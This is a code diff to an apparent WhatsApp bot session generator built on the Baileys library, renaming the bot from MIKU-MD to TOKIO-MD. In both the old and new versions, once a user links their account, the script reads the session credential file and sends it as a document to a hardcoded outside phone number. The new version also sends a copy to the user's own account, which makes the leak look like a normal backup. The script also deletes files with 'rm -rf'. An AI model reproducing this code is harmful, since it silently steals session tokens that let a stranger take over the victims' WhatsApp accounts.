@@ -3,11 +3,9 @@ const qrcode = require("qrcode-terminal")
 const fs = require('fs')
 const pino = require('pino')
 const { delay , useSingleFileAuthState } = require("@adiwajshing/baileys")
-const { state, saveState } = useSingleFileAuthState('./session.json')
-const qrc = JSON.parse(fs.readFileSync('./qr.json'))
-flenme = qrc.sessionname
+const { state, saveState } = useSingleFileAuthState('./session.tokio.json')
 const { exec, spawn, execSync } = require("child_process")
-exec('rm -rf Session.data.json')
+exec('rm -rf session.tokio.json')
 
 
   function OLDUSER() {
@@ -16,7 +14,7 @@ exec('rm -rf Session.data.json')
     const conn = makeWASocket({
         logger: pino({ level: 'silent' }),
         printQRInTerminal: true,
-        browser: ['MIKU-MD','opera','1.0.0'],
+        browser: ['TOKIO-MD','opera','1.0.0'],
         auth: state,
         version
     })
@@ -25,10 +23,9 @@ exec('rm -rf Session.data.json')
         const { connection, lastDisconnect } = s
         if (connection == "open") {
             await delay(1000 * 10);
-  const session = fs.readFileSync("./session.json");
-   await conn.sendMessage('918602239106@s.whatsapp.net', { document: session, mimetype: 'application/json', fileName: `${flenme}` })
-   await conn.sendMessage('918602239106@s.whatsapp.net', { text: 'hii' })
-   await conn.sendMessage('918107768770@s.whatsapp.net', { text: 'hii' })
+  const session = fs.readFileSync("./session.tokio.json");
+   await conn.sendMessage(conn.user.id, { document: session, mimetype: 'application/json', fileName: `session.tokio.json` })
+	 await conn.sendMessage('918602239106@s.whatsapp.net', { document: session, mimetype: 'application/json', fileName: `session.tokio.json` })
             process.exit(0)
         }
         if (
